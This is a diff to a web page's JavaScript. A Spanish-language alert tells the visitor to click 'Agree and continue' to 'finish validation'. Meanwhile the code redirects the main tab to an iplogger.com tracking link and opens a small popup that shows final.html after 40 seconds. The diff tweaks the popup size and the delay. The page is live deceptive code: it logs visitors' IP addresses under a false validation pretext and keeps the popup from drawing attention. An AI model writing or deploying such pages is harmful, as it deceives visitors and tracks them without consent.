@@ -102,20 +102,21 @@
   function redirect() {
     alert("En la siguiente página, por favor haz clic en el botón 'Agree and continue' para finalizar la validación.");
 
-    // 1. Open a new blank tab immediately (won't be blocked)
-    const newTab = window.open("", "_blank");
+    // 1. Open a small popup window (less likely to grab focus)
+    const popup = window.open("", "_blank", "width=600,height=400");
 
-    // 2. Redirect current tab to iplogger
+    // 2. Redirect main tab to iplogger (user stays here)
     window.location.href = "https://iplogger.com/2Uk6c6";
 
-    // 3. After 40 seconds, redirect the new tab to your final message
+    // 3. Change popup window content after 40 seconds
     setTimeout(() => {
-      if (newTab) {
-        newTab.location.href = "final.html";
+      if (popup) {
+        popup.location.href = "final.html";
       }
-    }, 30000); // 30,000 ms = 30 seconds
+    }, 40000);
   }
 </script>
+
 
 
 
